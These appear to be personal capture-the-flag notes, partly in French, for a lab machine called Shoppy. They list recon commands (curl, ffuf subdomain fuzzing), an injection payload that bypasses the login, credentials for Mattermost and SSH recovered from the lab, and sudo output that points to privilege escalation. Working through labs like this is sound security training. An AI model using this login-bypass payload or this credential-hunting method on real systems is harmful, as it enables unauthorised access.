# 10.10.11.180

# curl head get X
curl -I --head http://shoppy.htb/login?error=../../1

# faille possible
OSVDB-3092: /login/: This might be interesting...

# dns enum
ffuf -u http://shoppy.htb -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host : FUZZ.shoppy.htb" | grep 200

# fs 169 response size
ffuf -u http://shoppy.htb -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host : FUZZ.shoppy.htb" -fs 169

# /etc/host
mattermost.shoppy.htb

http://mattermost.shoppy.htb/login

#sql injection
admin'||'1==1

# connection login http://mattermost.shoppy.htb/login
username : josh
pasword : remembermethisway

# connection ssh
username : jaeger
password : Sh0ppyBest@pp!

# app session
secret : DJ7aAdnkCZs9DZWx[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

